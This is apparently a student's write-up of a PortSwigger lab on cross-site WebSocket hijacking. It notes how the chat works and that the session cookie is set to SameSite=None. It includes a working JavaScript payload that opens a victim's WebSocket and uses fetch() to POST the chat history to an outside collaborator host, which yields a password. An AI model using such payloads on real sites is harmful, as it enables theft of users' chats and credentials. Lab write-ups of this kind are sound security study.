---
tags:
  - websockets
---
# Cross-site WebSocket hijacking

## Instructions

This online shop has a live chat feature implemented using WebSockets.

To solve the lab, use the exploit server to host an HTML/JavaScript payload that uses a [cross-site WebSocket hijacking attack](https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking) to exfiltrate the victim's chat history, then use this gain access to their account.

## Solution

Note that the application has a live chat functionality.

![](attachments/websockets-lab-2/file-20251121082955929.png)

The websockets history in Burp shows the flow of the application. It looks like a READY message is sent from the client to the server before the server returns the chat history to the client.

![](attachments/websockets-lab-2/file-20251121082955935.png)

Additionally, it's important to note that the application uses a session cookie with the SameSite attribute set to None. 

![](attachments/websockets-lab-2/file-20251121082955936.png)

We can create some JavaScript that will establish a websocket connection and automatically send a "READY" message whenever a victim visits our site. This JS will also exfiltrate the victim's chat history to our collaborator server.

```js title="Working payload"
<script>
  let ws = new WebSocket(
	"wss://0ac1008a03b7059382c6067b00ad0072.web-security-academy.net/chat"
  );
  ws.onopen = () => {
	ws.send("READY");
  };
  ws.onmessage = (Event) => {
	fetch("https://6mtx0le322vg1un5gl0u84azgqmha7yw.oastify.com", {
	  method: "POST",
	  mode: "no-cors",
	  body: Event.data,
	});
  };
</script>
```

After delivering this to the victim, we get a series of POST requests to our collaborator; one of which contains carlos' password.

![](attachments/websockets-lab-2/file-20251121082955938.png)

## Lesson learned

If we have an XSS or other way to coerce a victim into visiting our website, it may be possible to abuse web sockets if:

- The websocket handshake relies on cookies
- There are no CSRF tokens or other unpredictable parameters

